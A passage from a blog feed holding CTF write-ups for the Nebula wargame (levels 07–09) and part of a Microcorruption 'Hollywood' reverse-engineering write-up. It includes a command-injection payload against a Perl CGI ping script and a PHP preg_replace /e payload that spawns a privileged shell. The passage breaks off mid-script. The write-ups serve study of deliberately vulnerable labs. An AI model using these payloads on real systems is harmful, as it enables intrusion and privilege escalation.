  &lt;span class=&quot;nv&quot;&gt;$host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;@output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`ping -c 3 $host 2&amp;gt;&amp;amp;1`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;@output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$line&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# check if Host set. if not, display normal page, etc&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;ping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Host&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Though I am unfamiliar at all with perl, the line ` @output = &lt;code class=&quot;highlighter-rouge&quot;&gt;ping -c 3 $host 2&amp;gt;&amp;amp;1&lt;/code&gt;; ` looks quite suspicious. As “$host” is set to whatever is supplied as the argument, we should be able to inject command with this script. After we &lt;code class=&quot;highlighter-rouge&quot;&gt;cd&lt;/code&gt; into “/home/flag07”, we see 2 files: one is the source code shown above, and the other is a configuration document named “thttpd.conf”, which has the following content:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# /etc/thttpd/thttpd.conf: thttpd configuration file

# This file is for thttpd processes created by /etc/init.d/thttpd.
# Commentary is based closely on the thttpd(8) 2.25b manpage, by Jef Poskanzer.

# Specifies an alternate port number to listen on.
port=7007

# Specifies a directory to chdir() to at startup. This is merely a convenience -
# you could just as easily do a cd in the shell script that invokes the program.
dir=/home/flag07

# Do a chroot() at initialization time, restricting file access to the program's
# current directory. If chroot is the compiled-in default (not the case on
# Debian), then nochroot disables it. See thttpd(8) for details.
nochroot
#chroot

# Specifies a directory to chdir() to after chrooting. If you're not chrooting,
# you might as well do a single chdir() with the dir option. If you are
# chrooting, this lets you put the web files in a subdirectory of the chroot
# tree, instead of in the top level mixed in with the chroot files.
#data_dir=

# Don't do explicit symbolic link checking. Normally, thttpd explicitly expands
# any symbolic links in filenames, to check that the resulting path stays within
# the original document tree. If you want to turn off this check and save some
# CPU time, you can use the nosymlinks option, however this is not
# recommended. Note, though, that if you are using the chroot option, the
# symlink checking is unnecessary and is turned off, so the safe way to save
# those CPU cycles is to use chroot.
#symlinks
#nosymlinks

# Do el-cheapo virtual hosting. If vhost is the compiled-in default (not the
# case on Debian), then novhost disables it. See thttpd(8) for details.
#vhost
#novhost

# Use a global passwd file. This means that every file in the entire document
# tree is protected by the single .htpasswd file at the top of the tree.
# Otherwise the semantics of the .htpasswd file are the same. If this option is
# set but there is no .htpasswd file in the top-level directory, then thttpd
# proceeds as if the option was not set - first looking for a local .htpasswd
# file, and if that doesn't exist either then serving the file without any
# password. If globalpasswd is the compiled-in default (not the case on Debian),
# then noglobalpasswd disables it.
#globalpasswd
#noglobalpasswd

# Specifies what user to switch to after initialization when started as root.
user=flag07

# Specifies a wildcard pattern for CGI programs, for instance &quot;**.cgi&quot; or
# &quot;/cgi-bin/*&quot;. See thttpd(8) for details.
cgipat=**.cgi

# Specifies a file of throttle settings. See thttpd(8) for details.
#throttles=/etc/thttpd/throttle.conf

# Specifies a hostname to bind to, for multihoming. The default is to bind to
# all hostnames supported on the local machine. See thttpd(8) for details.
#host=

# Specifies a file for logging. If no logfile option is specified, thttpd logs
# via syslog(). If logfile=/dev/null is specified, thttpd doesn't log at all.
#logfile=/var/log/thttpd.log

# Specifies a file to write the process-id to. If no file is specified, no
# process-id is written. You can use this file to send signals to thttpd. See
# thttpd(8) for details.
#pidfile=

# Specifies the character set to use with text MIME types.
#charset=iso-8859-1

# Specifies a P3P server privacy header to be returned with all responses. See
# http://www.w3.org/P3P/ for details. Thttpd doesn't do anything at all with the
# string except put it in the P3P: response header.
#p3p=

# Specifies the number of seconds to be used in a &quot;Cache-Control: max-age&quot;
# header to be returned with all responses. An equivalent &quot;Expires&quot; header is
# also generated. The default is no Cache-Control or Expires headers, which is
# just fine for most sites.
#max_age=
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running the first file by itself gives the result of a help command, which is not important. However, running the file by &lt;code class=&quot;highlighter-rouge&quot;&gt;./index.cgi Host=;whoami&lt;/code&gt; provided the results “level07”. Clearly, the injection works, but unfortunately the user is not what we desire. Inspection of the second file reveals it is for &lt;code class=&quot;highlighter-rouge&quot;&gt;thttpd&lt;/code&gt;, which is a lightweight http server. Some key configs are “port=7007” and “user=flag07”. This tells us which port the server is on and what user it is running at. “cgipat=**.cgi” shows it can run any perl program that is in the folder “dir=/home/flag07”. Sweet!&lt;/p&gt;

&lt;p&gt;This means we just have to go to the website 127.0.0.1:7007/index.cgi with the arguments “Host=;whoami” and it should return “flag07”. To test this out, we can run the following wget command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level07@nebula:/home/flag07&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget &lt;span class=&quot;nt&quot;&gt;-qO&lt;/span&gt; - http://127.0.0.1:7007/index.cgi?Host&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%3Bwhoami
&amp;lt;html&amp;gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;flag07
&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Indeed, “flag07” is returned as the user. By changing “whoami” to “getflag”, we can obtain the flag, with the confirmation printed in the website output:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level07@nebula:/home/flag07&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget &lt;span class=&quot;nt&quot;&gt;-qO&lt;/span&gt; - http://127.0.0.1:7007/index.cgi?Host&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%3Bgetflag
&amp;lt;html&amp;gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;You have successfully executed getflag on a target account
&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;level08&quot;&gt;Level08&lt;/h2&gt;

&lt;p&gt;As usual, cd into the required file location. Running ls, there appears to be only 1 file, “capture.pcap”. When attempting to open it I have been warned it is a binary file, which is has no use to me. Checking the type of the “capture.pcap” by “file capture.pcap” shows it is a “tcpdump capture file”. After some googling, it appears the file can be read using &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpflow -Cr capture.pcap&lt;/code&gt;. This prints the content of the packages to stdout. The result is the following information:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level08@nebula:~$ tcpflow -Cr /home/flag08/capture.pcap
..%
..%
..&amp;amp;..... ..#..'..$
..&amp;amp;..... ..#..'..$
.. .....#.....'.........
.. .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm..
........&quot;........!
........&quot;..&quot;.....b........b.....B.
..............................1.......!
..&quot;....
..&quot;....
..!...........&quot;
........&quot;
..&quot;................
.....................

Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)

..wwwbugs login:
l
.l
e
.e
v
.v
e
.e
l
.l
8
.8

.
.
Password:
b
a
c
k
d
o
o
r
.
.
.
0
0
R
m
8
.
a
t
e

.

.
.
Login incorrect
wwwbugs login:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It appears the password is recorded, but unfortunately it is cluttered with some control symbols. We to inspect the file in hex and determine what the control symbols are. To do so, we need to run &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpflow -r capture.pcap&lt;/code&gt; (without -C), which stores the information in a file. As we do not have write privileges, we need to cd back to our home folder. After running the above command, 2 files are generated. Inspecting the files using &lt;code class=&quot;highlighter-rouge&quot;&gt;less 059.233.235.218.39247-059.233.235.223.12121&lt;/code&gt; shows the password is “backdoor^?^?^?00Rm8^?ate”. ‘^?’ is the control symbol for backspace, thus the character before it is removed. Piecing together the output, the password becomes “backd00Rmate”. Thus we can su into flag08, and execute &lt;code class=&quot;highlighter-rouge&quot;&gt;flag08&lt;/code&gt; successfully.&lt;/p&gt;

&lt;h2 id=&quot;level09&quot;&gt;Level09&lt;/h2&gt;

&lt;p&gt;At the start, the description mentions a C setuid wrapper exists for some PHP code, suggesting the PHP code is vulnerable and can potentially spawn a shell with escalated privileges&lt;/p&gt;

&lt;p&gt;A PHP source code is provided. I used the PHP documentation to guide myself through the functions it used. One that caught my attention is the function &lt;code class=&quot;highlighter-rouge&quot;&gt;preg_replace&lt;/code&gt; on line 15. Notice the ‘e’ at the end of the first argument; this means the second argument will be evaluated as PHP code after second argument has been replaced. This is a &lt;a href=&quot;https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval&quot;&gt;known security risk&lt;/a&gt; and the modifier was deprecated and then removed.&lt;/p&gt;

&lt;p&gt;Further notice the double quotations used for the second argument. &lt;a href=&quot;https://stackoverflow.com/questions/3446216/what-is-the-difference-between-single-quoted-and-double-quoted-strings-in-php&quot;&gt;This&lt;/a&gt; indicates the use of curly braces can allow evaluation of the contents inside the braces. Apparently this is called complex (curly) braces. Together, we can create our attack string as &lt;code class=&quot;highlighter-rouge&quot;&gt;[email {${system(sh)}}]&lt;/code&gt;. The “[email]” is required for the string to be picked by the regex. The inner “{…}” allows the evaluation of the function. The outer “{$…}” is the complex (curly) braces.&lt;/p&gt;

&lt;p&gt;Thus, the shell can be spawned by the following commands that are executed in &lt;code class=&quot;highlighter-rouge&quot;&gt;~&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; can be executed in the shell:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[email {${system(sh)}}]'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
/home/flag09/flag09 &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Sun, 07 Apr 2019 22:40:32 +1000</pubDate>
        <link>zijunh.github.io/2019/04/nebula/</link>
        <guid isPermaLink="true">zijunh.github.io/2019/04/nebula/</guid>
        
        <category>exploit education</category>
        
        <category>solution</category>
        
        <category>nebula</category>
        
        
        <category>exploit education</category>
        
      </item>
    
      <item>
        <title>Microcorruption - Hollywood: Write-up</title>
        <description>&lt;h2 id=&quot;initial-information&quot;&gt;Initial information&lt;/h2&gt;

&lt;p&gt;In the manual for the lock, it claims “this lock is not attached to any hardware security module”, suggesting no interrupts will be used to open the door. This implies the password must be stored in memory; if we can reverse engineer the program in debug, we can obtain the password. However, this could be difficult due to the “new hardware random number generator”, which makes it “impossible to know where the password will be”. This is also quite obvious looking at the extremely short and garbage-looking code that is displayed by the disassembly.&lt;/p&gt;

&lt;h2 id=&quot;the-input&quot;&gt;The input&lt;/h2&gt;

&lt;p&gt;We can only enter one string for the password. I did not check for the length as the initial information suggests the only way to solve the problem is to reverse engineer the password itself.&lt;/p&gt;

&lt;h2 id=&quot;the-exploit&quot;&gt;The exploit&lt;/h2&gt;

&lt;p&gt;Clearly, the input string will be compared with the password at some point to verify it. Therefore, we can focus on the program after the input of the string, which saves us some time and effort. As the online disassembler is not useful during the process, I recommend using a better disassembler with a scripting functionality that supports the MSP430 architecture. The only one that appears to support MSP430 is IDA pro, which is very expensive. I did not have the luxury to use it, so I will be using the online disassembler with some javascript (only disadvantage is slow) to solve this problem.&lt;/p&gt;

&lt;p&gt;After entering the password, one can search for the string within the memory. The process must be repeated many time to ensure its storage location is not randomised as well. Eventually, we can find the input string stored at 0x2600.&lt;/p&gt;

&lt;p&gt;Now, we must step through the program to find out what is happening. The useful instructions are selected and shown below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...

3240 00a0      mov	#0xa000, sr 
b012 1000      call	#0x10

...

0c4f           mov	r15, r12
3cf0 fe0f      and	#0xffe, r12
3c50 00e0      add	#0xe000, r12

...

8c4f 0000      mov	r15, 0x0(r12)
...
8c4f 0200      mov	r15, 0x2(r12)
...
8c4f 0400      mov	r15, 0x4(r12)
...
8c4f 0600      mov	r15, 0x6(r12)
...
8c4f 0800      mov	r15, 0x6(r12)
...
8c4f 0a00      mov	r15, 0xa(r12)
...
8c4f 0c00      mov	r15, 0xc(r12)

...

004c           br	r12
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From experimentation, calling the interrupt with 0xa000 stores a random number in r15. The program then calculated address within the range 0xe000 and 0xefff and stores it in r12. 16 bytes of information are written, starting from r12. Eventually, the program jumps to r12, where the written information is executed. From this segment of code, we can hypothesis the values stored at r12 are the unobfuscated instructions that does the password comparison. This is proved when the first instruction is &lt;code class=&quot;highlighter-rouge&quot;&gt;mov #0x2600, r5&lt;/code&gt;; recall 0x2600 is the address of the input. The long sequences  of code we found are merely used to unobfuscated the instructions.&lt;/p&gt;

&lt;p&gt;To proceed with our analysis we need to obtain all the instructions that are ran at r12. This requires use to step through the massive loops of instructions that unobfuscate the code. This will take too much effort manuually, so a script is required. Even though the online debugger does not have a scripting function, we can write a small javascript program that utilises the &lt;code class=&quot;highlighter-rouge&quot;&gt;parse&lt;/code&gt; function, which parses its first argument as a command entered in the debugger. We can then store all the instructions executed at any address that starts with ‘e’. In this program, I have calculated the offsets for some important code fragments in the program to slightly speed up the program. As the debugging process is performed on the server, an 1 second delay is added to allow the information to transfer. This results in the following program:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;dic&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Promise&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;resolve&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;runCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;reg0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;textContent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0010&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0x&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;reg0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;textContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;break &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;padStart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unbreak &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;padStart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0x&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;reg0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;textContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;break &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;padStart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

